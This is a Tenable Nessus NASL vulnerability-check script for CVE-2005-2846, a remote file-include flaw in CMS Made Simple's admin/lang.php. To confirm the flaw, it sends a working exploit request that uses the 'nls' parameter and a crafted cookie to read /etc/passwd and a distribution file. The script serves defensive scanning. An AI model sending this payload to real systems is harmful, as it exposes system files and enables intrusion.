#
# (C) Tenable Network Security
#


if (description) {
  script_id(19551);
  script_version ("$Revision: 1.6 $");

  script_cve_id("CVE-2005-2846");
  script_bugtraq_id(14709);

  name["english"] = "CMS Made Simple nls Parameter File Include Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is vulnerable to
remote file include attacks. 

Description :

The remote host appears to be running CMS Made Simple, a content
management system written in PHP. 

The version of CMS Made Simple installed on the remote host fails to
properly sanitize user-supplied input to the 'nls' parameter of the
'admin/lang.php' script before using it to include PHP code.  By
leveraging this flaw, an attacker may be able to view arbitrary files
on the remote host and execute arbitrary PHP code, possibly taken from
third-party hosts. 

See also : 

http://www.securityfocus.com/archive/1/409654
http://forum.cmsmadesimple.org/index.php/topic,1554.0.html

Solution : 

Upgrade to CMS Made Simple 0.10.1 or later.

Risk factor : 

Medium / CVSS Base Score : 6
(AV:R/AC:H/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for nls parameter file include vulnerability in CMS Made Simple";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");
 
  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/cms", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read a couple of files.
  req = http_get(
    item:string(
      dir, "/admin/lang.php?",
      "CMS_ADMIN_PAGE=1&",
      # nb: password file
      "nls[file][", SCRIPT_NAME, "][1]=/etc/passwd&",
      # GPL COPYING file, located in the main distribution directory.
      "nls[file][", SCRIPT_NAME, "][2]=../COPYING"
    ),
    port:port
  );
  req = str_replace(
    string:req,
    find:"User-Agent:",
    replace:string(
      "Cookie: cms_language=", SCRIPT_NAME, "\r\n",
      "User-Agent:"
    )
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # there's mention of the GPL
    "GNU GENERAL PUBLIC LICENSE" >< res
  ) {
    security_warning(port);
    exit(0);
  }
}
